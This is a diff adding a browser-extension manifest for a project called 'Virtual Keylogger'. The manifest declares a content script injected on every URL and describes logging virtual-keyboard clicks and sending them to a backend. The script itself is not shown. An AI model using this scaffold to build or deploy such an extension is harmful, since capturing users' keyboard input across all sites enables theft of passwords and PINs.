@@ -1,0 +1,18 @@
+{
+    "manifest_version": 3,
+    "name": "Virtual Keylogger",
+    "description": "Logs clicks on the virtual keyboard and sends them to the backend.",
+    "version": "0.0.1",
+    "author": "ayamdobhal",
+    "content_scripts": [
+        {
+            "matches": [
+                "*://*"
+            ],
+            "js": [
+                "src/index.js"
+            ]
+        }
+    ],
+    "homepage_url": "https://github.com/ayamdobhal/virtual-keylogger"
+}
